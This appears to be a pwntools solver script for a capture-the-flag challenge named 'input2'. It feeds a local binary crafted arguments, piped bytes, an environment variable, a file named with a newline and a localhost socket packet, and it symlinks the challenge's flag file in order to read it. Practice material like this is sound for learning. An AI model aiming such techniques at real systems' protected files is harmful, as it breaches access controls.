#!/bin/python3
from pwn import *
import os
import tempfile
import socket
tmp_dir = ''
HOST = '127.0.0.1'  # Replace with target IP
PORT = 1337         # Replace with target port


def generate_arguemnt_list():
    argument_list = [b'0' for i in range(100)]
    argument_list[ord('A')] = p8(0x0)
    argument_list[ord('B')] = "\x20\x0a\x0d"
    argument_list[ord('C')] = str(PORT)

    return argument_list

def generate_file_descriptors():
    r1, w1 = os.pipe()
    r2, w2 = os.pipe()
    os.write(w1, b"\x00\x0a\x00\xff")
    os.write(w2, b"\x00\x0a\x02\xff")

    return (r1, r2)

def generate_env():
    return {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}

def generate_specail_file():
    global tmp_dir
    tmp_dir = tempfile.TemporaryDirectory()
    temp_file_path = os.path.join(tmp_dir.name, '\n')
    temp_file = open(temp_file_path, 'wb')
    temp_file.write(4*b'\x00')
    temp_file.close()
    os.system(f"ln -s /home/input2/flag {tmp_dir.name}/flag")
    print(temp_file.name)

def send_packet():
    payload = b"\xde\xad\xbe\xef"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sok:
        sok.connect((HOST, PORT))
        sok.sendall(payload)
        print(f"Sent: {payload.hex()}")


def get_process():
    path = ['./input2'] + generate_arguemnt_list()
    if args.GDB:
        return gdb.debug(path, gdbscript="tbreak *main+220\n c")

    desc = generate_file_descriptors()
    generate_specail_file()
    return process(executable='/home/input2/input2',
                   argv=generate_arguemnt_list(),
                   stdin=desc[0],
                   stderr=desc[1],
                   env=generate_env(),
                   cwd=tmp_dir.name,
                   )

io = get_process()
send_packet()
io.interactive()
